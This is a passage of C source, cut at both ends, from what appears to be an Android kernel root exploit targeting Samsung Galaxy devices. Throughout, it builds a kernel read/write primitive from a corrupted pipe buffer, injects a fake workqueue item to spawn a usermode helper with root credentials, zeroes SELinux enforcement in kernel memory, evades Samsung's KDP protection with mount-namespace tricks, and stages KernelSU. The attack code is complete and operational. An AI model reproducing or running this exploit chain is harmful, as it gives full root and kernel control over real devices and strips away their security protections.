                            (char *)"/data/local/tmp/ksu_stage.sh", NULL};

        execve("/system/bin/sh", av, envp);
    }
    logf("[umh] exec failed errno=%d\n", errno);
    _exit(127);
}

static int wait_child_main(const char *mode)
{
    struct child_report rep;
    char ch;
    int hello = CHILD_HELLO;

    /* Unbuffered: if the child dies to a kernel fault its logs survive. */
    setvbuf(stdout, NULL, _IONBF, 0);
    pin(g_cpu);
    logf("[child] alive, waiting for go\n");
    if (write(4, &hello, sizeof(hello)) != sizeof(hello))
        _exit(130);
    if (read(3, &ch, 1) != 1)
        _exit(131);
    close(3);
    logf("[child] go received, calling getuid\n");

    memset(&rep, 0, sizeof(rep));
    rep.magic = CHILD_MAGIC;
    rep.uid = (int)syscall(SYS_getuid);
    rep.euid = (int)syscall(SYS_geteuid);
    logf("[child] woke uid=%d euid=%d\n", rep.uid, rep.euid);
    if (rep.uid != 0)
    {
        rep.setuid_ret = -1;
        (void)write(4, &rep, sizeof(rep));
        close(4);
        logf("[-] child uid is not 0: cred write did not land\n");
        _exit(3);
    }

    if (!strcmp(mode, "fake"))
    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};
        int st = 0;
        pid_t w;

        (void)write(4, &rep, sizeof(rep));
        close(4);
        logf("[fake] child uid=%d euid=%d; forking worker\n",
             rep.uid, rep.euid);
        w = fork();
        if (w == 0)
        {
            /*
             * While the exploit still holds SELinux permissive, move this
             * worker to the init domain: KSU's sepolicy only allows init
             * to reach the ksud domain (DirtyFrag bootstrap flow).
             */
            {
                int cfd = open("/proc/self/attr/current", O_WRONLY);

                if (cfd >= 0)
                {
                    (void)!write(cfd, "u:r:init:s0", 11);
                    close(cfd);
                }
            }
            /*
             * Android 16+ KDP SIGKILLs a directly exec'ed kdp-variant ksud
             * (exit 137).  Hide it behind a bind mount over
             * /system/bin/logcat inside a private mount namespace and exec
             * that path instead (fusion-s24u verified flow on S24U).
             */
            logf("[fake] pre-unshare ctx=%s\n",
                 mode && 0 ? "" : "");
            {
                char ctxbuf[128];
                int cfd = open("/proc/self/attr/current", O_RDONLY);

                if (cfd >= 0)
                {
                    int cn = read(cfd, ctxbuf, sizeof(ctxbuf) - 1);

                    if (cn > 0)
                    {
                        ctxbuf[cn] = 0;
                        logf("[fake] worker ctx=%s", ctxbuf);
                    }
                    close(cfd);
                }
            }
            if (unshare(CLONE_NEWNS) == 0)
            {
                (void)mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL);
                logf("[fake] bind rc=%d errno=%d\n",
                     (int)mount("/data/local/tmp/samtimer/ksud", "/system/bin/logcat",
                                NULL, MS_BIND, NULL),
                     errno);
            }
            else
                logf("[fake] unshare failed errno=%d\n", errno);
            logf("[fake] exec'ing sh ksu_stage.sh\n");
            {
                char *const av[] = {(char *)"sh",
                                    (char *)"/data/local/tmp/ksu_stage.sh",
                                    NULL};

                execve("/system/bin/sh", av, envp);
            }
            logf("[fake] exec FAILED errno=%d\n", errno);
            _exit(127);
        }
        if (w > 0)
            waitpid(w, &st, 0);
        logf("[fake] worker exit=%#x\n", st);
        _exit(0);
    }

    /*
     * Plant 1 zeroes uid+gid only; egid is still 2000.  If it stays that way
     * across execve(), cap_bprm's setgid downgrade intersects permitted with
     * the old (empty) set and the expanded bset never becomes effective.
     */
    errno = 0;
    {
        long sg = syscall(SYS_setresgid, 0, 0, 0);

        logf("[child] setresgid(0)=%ld errno=%d\n", sg, errno);
    }
    errno = 0;
    rep.setuid_ret = (int)syscall(SYS_setuid, 0);
    rep.setuid_errno = errno;
    {
        uid_t ru = 0, eu = 0, su = 0;

        getresuid(&ru, &eu, &su);
        rep.ruid = (int)ru;
        rep.reuid = (int)eu;
        rep.rsuid = (int)su;
    }
    (void)write(4, &rep, sizeof(rep));
    close(4);
    logf("[child] setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
         rep.setuid_ret, rep.setuid_errno, rep.ruid, rep.reuid, rep.rsuid);
    if (rep.setuid_ret != 0)
    {
        logf("[-] setuid(0) failed; not running a shell\n");
        _exit(4);
    }

    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};

        if (!strcmp(mode, "shell"))
        {
            /*
             * Re-exec ourselves: the euid=0 exec grants the bset caps
             * (CAP_SETGID) needed to add the /data and /data/local/tmp
             * supplementary groups before handing over to the real sh.
             */
            char *const av[] = {(char *)"timer", (char *)"setshell",
                                (char *)"shell", NULL};

            execve("/proc/self/exe", av, envp);
        }
        else
        {
            char *const av[] = {(char *)"sh", (char *)"-c",
                                (char *)"id; cat /proc/self/attr/current 2>/dev/null; "
                                        "echo ROOT_SHELL_OK",
                                NULL};

            execve("/system/bin/sh", av, envp);
        }
    }
    logf("[-] shell exec failed errno=%d\n", errno);
    _exit(5);
}

/*
 * Wake an idle system_unbound_wq worker (BuSung-dev/Root-My-Galaxy
 * reference kick): opening and closing a pty pair queues tty hangup
 * works on system_unbound_wq, which wakes a pool worker.
 */
static int wake_system_unbound(void)
{
    char slave_name[128];
    int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
    int slave_fd;

    if (master_fd < 0 || grantpt(master_fd) != 0 ||
        unlockpt(master_fd) != 0 ||
        ptsname_r(master_fd, slave_name, sizeof(slave_name)) != 0)
    {
        if (master_fd >= 0)
            close(master_fd);
        return 0;
    }
    slave_fd = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
    if (slave_fd < 0)
    {
        close(master_fd);
        return 0;
    }
    close(master_fd);
    close(slave_fd);
    return 1;
}

/*
 * umhpipe chain (RiosWesley/SamTimer design): the timer plant gives one
 * controlled 8-byte write, which is used to point pipe->bufs at a fake
 * pipe_buffer and thereby build a stable kernel read/write primitive on a
 * user page.  That primitive reads system_unbound_wq -> dfl_pwq ->
 * worker_pool and links a fake work_struct whose func is
 * call_usermodehelper_exec_work: the kernel then spawns our helper with a
 * genuine root cred -- no cred forgery, no DEFEX race, and the helper's
 * death is an ordinary exit.
 */
static int umhpipe_main(unsigned char *raw)
{
    struct plant_res r;
    int pf[2] = {-1, -1};
    char ch;
    long n;
    unsigned char *mark = (unsigned char *)MAP_FAILED;
    unsigned long long mark_va = 0; /* mark's linear (kernel) alias */
    unsigned long long marker_pfn = 0;
    unsigned long long wq = 0, pwq = 0, pool = 0, val = 0;
    unsigned long long wl_next = 0, wl_prev = 0;
    unsigned int nw = 0, ni = 0;
    unsigned char kb[0x400];
    unsigned long long sym_alias;
    int ready = 0;

    write_ksu_script();
    write_umh_script();
    ensure_pool();
    ensure_raw();
    drain_timers();
    memset(&r, 0, sizeof(r));

    /*
     * e1s runs with panic_on_warn=1; the self-parent (RB_EMPTY_NODE)
     * plants take timerqueue_del()'s WARN_ON_ONCE, so the warning must be
     * defused before the first plant.  The stage script restores it.
     */
    if (stage_write(0, 0, "panic_on_warn", raw, NULL, PANIC_ON_WARN_STATIC))
        park_forever("panic_on_warn pre-plant failed");

    /*
     * Pre-fault the VMA/page-table before the trace, free the data page
     * with MADV_DONTNEED, then let the traced marker write allocate the
     * data page.  The first mm_page_alloc for this pid is therefore the
     * marker page, not a page table or a pipe buffer page.
     */
    mark = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mark != MAP_FAILED)
    {
        (void)madvise(mark, 0x1000, MADV_DONTFORK);
        *(unsigned long long *)mark = 0xdeadbeefdeadbeefULL;
        (void)madvise(mark, 0x1000, MADV_DONTNEED);
    }
    /* Leave exactly one byte queued so pipe->tail == 1: the fake
     * pipe_buffer then lives at node+0x28 (buffer slot 1). */
    for (int pa = 0; pa < 3 && !g_pipe_addr; pa++)
    {
        if (pa)
        {
            if (pf[0] >= 0)
                close(pf[0]);
            if (pf[1] >= 0)
                close(pf[1]);
            pf[0] = pf[1] = -1;
            logf("[+] pipe leak retry %d\n", pa + 1);
        }
        set_pipe_events(1);
        trace_start();
        if (mark != MAP_FAILED)
            *(unsigned long long *)mark = 0x1122334455667788ULL;
        if (pipe(pf) != 0)
            park_forever("pipe() failed");
        (void)!write(pf[1], "A", 1);
        (void)!read(pf[0], &ch, 1);
        (void)!write(pf[1], "A", 1);
        usleep(20000);
        trace_stop();
        set_pipe_events(0);
        n = read_cpu(g_cpu, raw, 48u << 20);
        logf("[+] piperead trace n=%ld\n", n);
        if (n > 0)
            scan_pipe_alloc(raw, (size_t)n, getpid());
    }
    if (!g_pipe_addr)
        park_forever("pipe addr leak failed");
    logf("[+] pipe=%#llx fds=%d/%d\n", g_pipe_addr, pf[0], pf[1]);
    {
        unsigned long long upfn = 0;
        unsigned long long cands[16];
        int pc = 0;

        if (n > 0)
            pc = scan_page_alloc_pfns(raw, (size_t)n, getpid(),
                                      cands, 16);
        if (pc > 0)
            upfn = cands[0];
        logf("[+] pipe user pfn=%#llx recs=%d\n", upfn, pc);
        if (!upfn)
            park_forever("user page pfn leak failed");
        marker_pfn = upfn;

        /*
         * The first order-0 allocation is not guaranteed to be our
         * marker page (page tables/pipe pages can land first).  Read the
         * marker value back from each candidate through the pipe plant
         * before trusting its pfn.
         */
        {
            unsigned long long verified = 0;

            for (int k = 0; k < pc && k < 16; k++)
            {
                struct plant_res vr;
                unsigned long long mval = 0;
                ssize_t rn;
                unsigned long long pfn = cands[k];
                int vok = 0;

                for (int tr = 0; tr < 3 && !vok; tr++)
                {
                    memset(&vr, 0, sizeof(vr));
                    g_pipe_target_page =
                        spage_of_linear(g_base + (pfn << 12));
                    g_pipe_target_off = 0;
                    g_pipe_write = 0;
                    logf("[+] verify marker candidate %d pfn=%#llx "
                         "try=%d\n", k, pfn, tr + 1);
                    run_plant(g_pipe_addr + PIPE_INFO_BUF_OFF, 1, 6, &vr,
                              raw, 0);
                    if (vr.ok)
                        vok = 1;
                    else if (!vr.retry)
                        break;
                }
                if (!vok)
                    continue;
                errno = 0;
                rn = read(pf[0], &mval, sizeof(mval));
                logf("[+] marker candidate %d read n=%zd val=%#llx\n",
                     k, rn, mval);
                if (rn == 8 && mval == 0x1122334455667788ULL)
                {
                    verified = pfn;
                    break;
                }
            }
            if (!verified)
                park_forever("marker pfn verify failed");
            marker_pfn = verified;
            logf("[+] marker pfn verified=%#llx\n", marker_pfn);
        }
    }

    /*
     * Bootstrap: one plant whose fake pipe_buffer points at the pipe's own
     * page with CAN_MERGE; the 8-byte write then merges the user page's
     * linear address into pipe->bufs.  From then on pipe->bufs points at
     * our user page, which is stable, and all reads/writes edit the fake
     * pipe_buffer there from userspace.  No more fragile plants.
     */
    {
        unsigned long long pipe_page = g_pipe_addr & ~0xfffULL;
        unsigned int pipe_off =
            (unsigned int)((g_pipe_addr + PIPE_INFO_BUF_OFF) & 0xfffULL);
        int bn, berr;

        if (mark == (unsigned char *)MAP_FAILED || !marker_pfn ||
            !g_slide_set)
            park_forever("umh missing bootstrap state");
        mark_va = g_base + (marker_pfn << 12);
        memset(mark, 0, 0x1000);
        user_buf_set(mark, spage_of_linear(pipe_page), pipe_off, 0, 0x10);
        g_pipe_target_page = spage_of_linear(pipe_page);
        g_pipe_target_off = pipe_off;
        g_pipe_write = 1;
        logf("[+] umh bootstrap plant pipe=%#llx page=%#llx off=%#x "
             "mark=%p markva=%#llx pfn=%#llx\n", g_pipe_addr, pipe_page,
             pipe_off, mark, mark_va, marker_pfn);
        for (int ba = 0; ba < 5 && !r.ok; ba++)
        {
            memset(&r, 0, sizeof(r));
            run_plant(g_pipe_addr + PIPE_INFO_BUF_OFF, 1, 6, &r, raw, 0);
            if (!r.ok && !r.retry)
                break;
        }
        if (!r.ok)
            park_forever("umh bootstrap plant failed");
        errno = 0;
        bn = (int)write(pf[1], &mark_va, sizeof(mark_va));
        berr = errno;
        logf("[+] umh pipe->bufs=%#llx write n=%d errno=%d orig=%#llx\n",
             mark_va, bn, berr, g_pipe_bufs);
        if (bn != (int)sizeof(mark_va))
            park_forever("umh pipe bufs bootstrap failed");
    }

    /* All following operations use the user-page fake buffer.  The kernel
     * phys base is a bootloader constant; validate it read-only -- only a
     * candidate whose wq slot reads back as a linear pointer is accepted,
     * and nothing is written until it matches. */
    {
        static const unsigned long long cands[] = { KERNEL_PHYS_CANDIDATES };
        int found = 0;

        for (unsigned i = 0;
             i < sizeof(cands) / sizeof(cands[0]) && !found; i++)
        {
            g_kimage_phys = cands[i] + g_slide;
            sym_alias = alias_of_kimg(SYSTEM_UNBOUND_WQ_STATIC);
            if (user_pipe_read(pf[0], mark, sym_alias, &wq, 8) != 8)
                continue;
            logf("[+] umh phys-cand %#llx -> wq=%#llx\n", cands[i], wq);
            if (wq >= g_base && wq < 0xffffffc000000000ULL)
                found = 1;
        }
        if (!found)
            park_forever("umh bad wq (no kernel phys candidate matched)");
    }
    logf("[+] umh wq=%#llx (kimage_phys=%#llx)\n", wq, g_kimage_phys);
    if (user_pipe_read(pf[0], mark, wq, kb, 0x200) != 0x200)
        park_forever("umh wq page read failed");
    pwq = *(unsigned long long *)(kb + WQ_DFL_PWQ_OFF);
    logf("[+] umh pwq=%#llx (dfl_pwq off %#x)\n", pwq, WQ_DFL_PWQ_OFF);
    if (pwq < g_base || pwq >= 0xffffffc000000000ULL)
        park_forever("umh bad pwq");
    if (user_pipe_read(pf[0], mark, pwq, kb, 0x100) != 0x100)
        park_forever("umh pwq page read failed");
    pool = *(unsigned long long *)(kb + PWQ_POOL_OFF);
    val = *(unsigned long long *)(kb + PWQ_WQ_OFF);
    if (val != wq)
        park_forever("umh pwq->wq mismatch");
    logf("[+] umh pool=%#llx\n", pool);
    if (pool < g_base || pool >= 0xffffffc000000000ULL)
        park_forever("umh bad pool");
    for (int t = 0; t < 6; t++)
    {
        if (user_pipe_read(pf[0], mark, pool, kb, 0x80) != 0x80)
            park_forever("umh pool page read failed");
        wl_next = *(unsigned long long *)(kb + POOL_WORKLIST_OFF);
        wl_prev = *(unsigned long long *)(kb + POOL_WORKLIST_OFF + 8);
        nw = *(unsigned int *)(kb + POOL_NR_WORKERS_OFF);
        ni = *(unsigned int *)(kb + POOL_NR_IDLE_OFF);
        if (wl_next == pool + POOL_WORKLIST_OFF &&
            wl_prev == pool + POOL_WORKLIST_OFF && ni > 0)
            break;
        logf("[+] umh pool busy t=%d next=%#llx prev=%#llx "
             "workers=%u idle=%u\n", t, wl_next, wl_prev, nw, ni);
        usleep(100000);
    }
    logf("[+] umh worklist next=%#llx prev=%#llx workers=%u idle=%u\n",
         wl_next, wl_prev, nw, ni);
    if (wl_next != pool + POOL_WORKLIST_OFF ||
        wl_prev != pool + POOL_WORKLIST_OFF || ni == 0)
        park_forever("umh pool busy");

    if (g_umh_dry)
    {
        /* Restore pipe->bufs before parking: nothing else will. */
        if (g_pipe_bufs)
            user_pipe_write(pf[1], mark, g_pipe_addr + PIPE_INFO_BUF_OFF,
                            &g_pipe_bufs, sizeof(g_pipe_bufs));
        logf("[+] UMH_DRY_READY wq=%#llx pwq=%#llx pool=%#llx\n",
             wq, pwq, pool);
        park_forever("umh dry run -- offsets validated, not injecting");
    }

    if (access(ROOT_UMH_PATH, X_OK) != 0)
        park_forever("umh helper " ROOT_UMH_PATH
                     " missing (stage it first)");
    /*
     * Injection (BuSung-dev/Root-My-Galaxy reference design): the fake
     * work uses the REAL pwq -- work->data = pwq | color<<4 | 5 -- and
     * the real pwq's counters are incremented exactly like __queue_work
     * does, so no fake pool_workqueue is needed.  The list publish is two
     * ordered single-pointer writes (prev first, then next) so a worker
     * never observes a half-linked node.  Everything the kernel follows
     * is a linear address; the bytes themselves live in our user page.
     */
    unsigned long long pub_entry = 0, pub_worklist = 0;
    unsigned long long rb_inflight_addr = 0;
    unsigned int rb_inf = 0, rb_act = 0, rb_ref = 0;
    {
        unsigned long long work = mark_va + 0x100;
        unsigned long long entry = work + WORK_ENTRY_OFF;
        unsigned long long data = mark_va + ROOT_UMH_DATA_OFF;
        unsigned long long worklist = pool + POOL_WORKLIST_OFF;
        struct umh_kernel_data ud;
        unsigned long long *w;
        unsigned int color = 0, refcnt = 0, nr_active = 0, max_active = 0;
        unsigned int nr_inflight = 0, v32;
        unsigned long long inflight_addr;
        unsigned char zero = 0;
        unsigned long long n8;
        int sn, wn;

        if (user_pipe_read(pf[0], mark, pwq + PWQ_WORK_COLOR_OFF,
                           &color, 4) != 4 ||
            user_pipe_read(pf[0], mark, pwq + PWQ_REFCNT_OFF,
                           &refcnt, 4) != 4 ||
            user_pipe_read(pf[0], mark, pwq + PWQ_NR_ACTIVE_OFF,
                           &nr_active, 4) != 4 ||
            user_pipe_read(pf[0], mark, pwq + PWQ_MAX_ACTIVE_OFF,
                           &max_active, 4) != 4)
            park_forever("umh pwq state read failed");
        if (color >= 16 || refcnt == 0 || nr_active >= max_active)
            park_forever("umh bad pwq state");
        inflight_addr = pwq + PWQ_NR_IN_FLIGHT_OFF +
                        (unsigned long long)color * 4;
        if (user_pipe_read(pf[0], mark, inflight_addr,
                           &nr_inflight, 4) != 4)
            park_forever("umh nr_inflight read failed");
        logf("[+] umh pwq state color=%u refcnt=%u active=%u/%u "
             "inflight=%u\n", color, refcnt, nr_active, max_active,
             nr_inflight);

        memset(&ud, 0, sizeof(ud));
        snprintf(ud.path, sizeof(ud.path), "%s", ROOT_UMH_PATH);
        snprintf(ud.path + 16, sizeof(ud.path) - 16, "%s",
                 ROOT_UMH_ARG);
        snprintf(ud.uid, sizeof(ud.uid), "%u", (unsigned)getuid());
        {
            unsigned long long completion_addr =
                data + __builtin_offsetof(struct umh_kernel_data,
                                          completion);
            unsigned long long path_addr =
                data + __builtin_offsetof(struct umh_kernel_data, path);
            unsigned long long arg_addr =
                data + __builtin_offsetof(struct umh_kernel_data, arg);
            unsigned long long uid_addr =
                data + __builtin_offsetof(struct umh_kernel_data, uid);
            unsigned long long argv_addr =
                data + __builtin_offsetof(struct umh_kernel_data, argv);

            ud.completion.next = completion_addr +
                __builtin_offsetof(struct umh_completion, next);
            ud.completion.prev = ud.completion.next;
            ud.argv[0] = path_addr;
            ud.argv[1] = path_addr + 16;
            ud.argv[2] = 0;
            ud.argv[3] = 0;
            ud.envp[0] = 0;
        }
        memcpy((unsigned char *)mark + ROOT_UMH_DATA_OFF, &ud,
               sizeof(ud));
        w = (unsigned long long *)((unsigned char *)mark + 0x100);
        memset(w, 0, 0x70);
        w[0] = pwq | ((unsigned long long)color << 4) | 5;
        w[1] = worklist;
        w[2] = worklist;
        w[3] = UMH_EXEC_WORK_STATIC + g_slide; /* func */
        w[6] = data + __builtin_offsetof(struct umh_kernel_data,
                                         completion);
        w[7] = data + __builtin_offsetof(struct umh_kernel_data, path);
        w[8] = data + __builtin_offsetof(struct umh_kernel_data, argv);
        w[9] = data + __builtin_offsetof(struct umh_kernel_data, envp);
        /* wait = 0 (UMH_NO_WAIT): the kernel kfree's the info after exec. */
        *(int *)((unsigned char *)w + 48 + 32) = 0;

        /*
         * SELinux permissive for the helper's late-load: a precise one
         * byte zero of selinux_state.enforcing -- initialized (+2) is
         * never touched.  Verified from userspace right after.
         */
        {
            char enf[8] = "?";
            int efd;

            efd = open("/sys/fs/selinux/enforce", O_RDONLY);
            if (efd >= 0)
            {
                (void)read(efd, enf, sizeof(enf) - 1);
                close(efd);
            }
            logf("[+] umh enforce before=%c\n", enf[0]);
        }
        sn = user_pipe_write(pf[1], mark,
                             SELINUX_STATE_STATIC + g_slide, &zero, 1);
        {
            char enf[8] = "?";
            int efd;

            efd = open("/sys/fs/selinux/enforce", O_RDONLY);
            if (efd >= 0)
            {
                (void)read(efd, enf, sizeof(enf) - 1);
                close(efd);
            }
            logf("[+] umh selinux write n=%d enforce now=%c\n", sn,
                 enf[0]);
        }

        /* __queue_work-equivalent accounting on the real pwq. */
        v32 = nr_inflight + 1;
        wn = user_pipe_write(pf[1], mark, inflight_addr, &v32, 4);
        v32 = nr_active + 1;
        wn += user_pipe_write(pf[1], mark, pwq + PWQ_NR_ACTIVE_OFF, &v32, 4);
        v32 = refcnt + 1;
        wn += user_pipe_write(pf[1], mark, pwq + PWQ_REFCNT_OFF, &v32, 4);
        logf("[+] umh counters written n=%d\n", wn);
        pub_entry = entry;
        pub_worklist = worklist;
        rb_inflight_addr = inflight_addr;
        rb_inf = nr_inflight;
        rb_act = nr_active;
        rb_ref = refcnt;

        /*
         * Publish: prev first (the list still reads empty when walked
         * from next), verify, then next is the publish point.  A real
         * queue_work can land between the busy-check and the prev write;
         * the old prev is restored in that case, because a half-linked
         * head makes the worker's list_del on that work trip
         * __list_del_entry_valid -- a guaranteed panic.
         */
        n8 = entry;
        {
            unsigned long long old_prev = 0, chk = 0;

            if (user_pipe_read(pf[0], mark, worklist + 8,
                               &old_prev, 8) != 8)
                park_forever("umh worklist prev read failed");
            if (old_prev != worklist)
                park_forever("umh worklist busy before publish");
            wn = user_pipe_write(pf[1], mark, worklist + 8, &n8, 8);
            if (user_pipe_read(pf[0], mark, worklist, &chk, 8) != 8 ||
                chk != worklist)
            {
                unsigned int rv32;

                user_pipe_write(pf[1], mark, worklist + 8, &old_prev, 8);
                rv32 = rb_inf;
                user_pipe_write(pf[1], mark, rb_inflight_addr, &rv32, 4);
                rv32 = rb_act;
                user_pipe_write(pf[1], mark, pwq + PWQ_NR_ACTIVE_OFF,
                                &rv32, 4);
                rv32 = rb_ref;
                user_pipe_write(pf[1], mark, pwq + PWQ_REFCNT_OFF,
                                &rv32, 4);
                park_forever("umh worklist busy before publish "
                             "(prev + counters rolled back)");
            }
        }
        wn += user_pipe_write(pf[1], mark, worklist, &n8, 8);
        logf("[+] umh user work=%#llx entry=%#llx data=%#llx "
             "func=%#llx wl=%#llx publish=%d\n",
             work, entry, data, UMH_EXEC_WORK_STATIC + g_slide,
             worklist, wn);
    }
    /*
     * Wake an idle pool worker: opening and closing a pty pair queues tty
     * hangup works on system_unbound_wq (the reference kick), which wakes
     * a worker that then processes our linked item.
     */
    for (int round = 0; round < 8 && !ready; round++)
    {
        int wk = wake_system_unbound();

        if (round < 2 || wk == 0)
            logf("[+] umh wake round=%d pty=%d\n", round, wk);
        for (int j = 0; j < 250; j++)
        {
            if (access("/data/local/tmp/samtimer/umh-action.log", F_OK) == 0)
            {
                ready = 1;
                break;
            }
            usleep(40000);
        }
    }
    logf(ready ? "UMHPIPE_STARTED\n" : "UMHPIPE_MISSING\n");
    {
        /* Diagnostics read straight from our own mapping: the kernel
         * writes sub_info->retval (+0x54) and completion.done (+0x800)
         * through the linear alias of this very page, and the page is
         * ours to read -- no pipe primitive needed (which may have been
         * clobbered by then). */
        int rv = *(int *)(mark + 0x154);
        unsigned int done = *(unsigned int *)(mark + 0x800);
        unsigned long long fb0 = *(unsigned long long *)(mark + 0x28);
        unsigned long long fb2 = *(unsigned long long *)(mark + 0x38);

        logf("[+] umh sub_info retval=%d completion.done=%u\n", rv, done);
        logf("[+] umh fake buf page=%#llx off/len=%#llx\n", fb0, fb2);
        logf("[+] umh work data=%#llx next=%#llx prev=%#llx func=%#llx\n",
             *(unsigned long long *)(mark + 0x100),
             *(unsigned long long *)(mark + 0x108),
             *(unsigned long long *)(mark + 0x110),
             *(unsigned long long *)(mark + 0x118));
    }
    if (!ready && pub_entry)
    {
        /*
         * The work may still be linked in the pool worklist.  Exiting
         * with it linked is a guaranteed panic: our user page goes away
         * and the next worker to touch the pool walks freed memory.
         * Unlink it with a proper list_del (other works may sit behind
         * it) and roll the pwq counters back.
         */
        unsigned long long cur = 0, nxt = 0, prv = 0;
        unsigned int v32r;

        if (user_pipe_read(pf[0], mark, pub_worklist, &cur, 8) == 8 &&
            cur == pub_entry)
        {
            nxt = *(unsigned long long *)(mark + 0x108);
            prv = *(unsigned long long *)(mark + 0x110);
            /* next->prev = prev; prev->next = next */
            user_pipe_write(pf[1], mark, nxt + 8, &prv, 8);
            user_pipe_write(pf[1], mark, prv, &nxt, 8);
            v32r = rb_inf;
            user_pipe_write(pf[1], mark, rb_inflight_addr, &v32r, 4);
            v32r = rb_act;
            user_pipe_write(pf[1], mark,
                            pwq + PWQ_NR_ACTIVE_OFF, &v32r, 4);
            v32r = rb_ref;
            user_pipe_write(pf[1], mark, pwq + PWQ_REFCNT_OFF, &v32r, 4);
            logf("[+] umh work unlinked next=%#llx prev=%#llx "
                 "+ counters rolled back\n", nxt, prv);
        }
        else
            logf("[+] umh work already consumed (list next=%#llx)\n", cur);
    }
    /*
     * Restore the original pipe-buffer array so a later process teardown
     * frees a valid kmalloc object instead of the user page.
     */
    if (g_pipe_bufs)
        user_pipe_write(pf[1], mark, g_pipe_addr + PIPE_INFO_BUF_OFF,
                        &g_pipe_bufs, sizeof(g_pipe_bufs));
    else
        logf("[!] umh original pipe bufs not leaked; skip restore\n");

    /* The helper (real root cred) runs the stage script; wait for it. */
    {
        int ksu_ok = 0;

        for (int i = 0; i < 200; i++)
        {
            FILE *mf = fopen("/proc/modules", "r");
            char line[256];

            ksu_ok = 0;
            if (mf)
            {
                while (fgets(line, sizeof(line), mf))
                    if (!strncmp(line, "kernelsu", 8))
                        ksu_ok = 1;
                fclose(mf);
            }
            if (ksu_ok)
                break;
            usleep(100000);
        }
        if (ksu_ok)
            logf("KSU_LOADED\n");
        else
            logf("KSU_MISSING\n");
    }
    logf("[+] umhpipe done held=%d ready=%d\n", g_held, ready);
    if (g_held)
        park_forever("zombies held");
    if (!ready && pub_entry)
        park_forever("umh work pending -- holding the page (do not kill)");
    return 0;
}

int main(int argc, char **argv)
{
    unsigned char *raw;
    int shell_mode = 0, leak_only = 0, ids_only = 0;
    int umhpipe_mode = 0;

    setvbuf(stdout, NULL, _IONBF, 0);
    /*
     * Detach from the caller's session/process group immediately: when the
     * Shizuku UserService that spawned us is torn down it kills its process
     * group, and our death would let init reap the held zombies (stale
     * timer nodes) -- a guaranteed kernel panic.  From our own session only
     * a direct kill or reboot can end us.
     */
    (void)setsid();
    if (argc > 1 && !strcmp(argv[1], "wait"))
        return wait_child_main(argc > 2 ? argv[2] : "verify");
    if (argc > 1 && !strcmp(argv[1], "setshell"))
        return setshell_main(argc > 2 ? argv[2] : "shell");
    if (argc > 1 && !strcmp(argv[1], "setksu"))
        return setksu_main();
    if (argc > 1 && !strcmp(argv[1], "--umh"))
        return setksu_main();

    /* Device safety check: abort before any kernel writes if the running
     * device/kernel does not match offsets.h.  Helper modes above are exempt
     * (they run post-exploitation and do not use kernel symbol addresses). */
    if (device_safety_check() != 0)
        return 1;

    if (argc > 1 && !strcmp(argv[1], "shell"))
        shell_mode = 1;
    if (argc > 1 && !strcmp(argv[1], "leak"))
        leak_only = 1;
    if (argc > 1 && !strcmp(argv[1], "ids"))
        ids_only = 1;
    if (argc > 1 && !strcmp(argv[1], "fake"))
        g_fake_stage = 1;
    if (argc > 1 && !strcmp(argv[1], "umh"))
        g_umh_stage = 1;
    if (argc > 1 && !strcmp(argv[1], "umhpipe"))
        umhpipe_mode = 1;
    if (argc > 1 && !strcmp(argv[1], "umhread"))
    {
        umhpipe_mode = 1;
        g_umh_dry = 1;
    }

    raw = malloc(48u << 20);
    if (!raw)
        return 1;
    if (argc > 2 && !strcmp(argv[1], "cpu"))
        g_cpu = atoi(argv[2]);

    if (argv[0] && argv[0][0] == '\0')
        _exit(42);

    {
        struct rlimit rl;

        if (!getrlimit(RLIMIT_NOFILE, &rl))
        {
            rl.rlim_cur = rl.rlim_max;
            if (rl.rlim_cur > 65536)
                rl.rlim_cur = 65536;
            (void)setrlimit(RLIMIT_NOFILE, &rl);
        }
    }

    pin(g_cpu);
    logf("[+] pid=%d cpu=%d\n", getpid(), g_cpu);
    enable_events();
    kick_rss();
    usleep(50000);

    {
        int disc_ok = 0;

        for (int t = 0; t < 3 && !disc_ok; t++)
        {
            if (discover_page_types(raw) == 0)
                disc_ok = 1;
            else
                logf("[-] page type discovery retry %d\n", t + 1);
        }
        if (!disc_ok)
            return 1;
    }
    if (ids_only)
        return 0;

    g_base = calibrate_base(raw);
    if (!g_base)
    {
        logf("[-] base calibration failed\n");
        return 1;
    }
    prefill_timers(PREFILL_TIMERS);

    /* The umhpipe chain is self-contained: no child cred leak is needed,
     * the KASLR slide comes from the plant's own trace sites. */
    if (umhpipe_mode)
    {
        int rc = umhpipe_main(raw);

        free(raw);
        return rc;
    }

    pid_t C = -1;
    int go_fd = -1, st_fd = -1;
    unsigned long long R = leak_cred(raw, &C, &go_fd, &st_fd, shell_mode,
                                     &g_child_task);
    if (!R)
    {
        logf("[-] cred leak failed\n");
        if (g_held)
            park_forever("cred leak failed; zombies held");
        return 1;
    }
    logf("[+] child=%d cred=%#llx target=%#llx\n", C, R, R + CRED_UID_OFF);
    if (leak_only)
    {
        close(go_fd);
        close(st_fd);
        kill(C, SIGKILL);
        waitpid(C, NULL, 0);
        logf("[+] leak-only run complete\n");
        if (g_held)
            park_forever("leak-only done; zombies held");
        return 0;
    }
    if (g_fake_stage)
        write_ksu_script();
    ensure_pool();
    ensure_raw();
    drain_timers();

    if (!g_fake_stage)
    {
        struct plant_res r;
        memset(&r, 0, sizeof(r));
        /*
         * timer shell: also make SELinux permissive for the shell.  A
         * shell-domain root cannot write /sys/fs/selinux/enforce (policy
         * denies it), so clear selinux_state.enforcing with one zero
         * plant before waking the child.
         */
        if (shell_mode)
        {
            if (stage_write(0, 0, "selinux", raw, NULL,
                            SELINUX_ENFORCE_ZAP))
                park_forever("selinux write failed");
            logf("[+] selinux_state.enforcing cleared (permissive until "
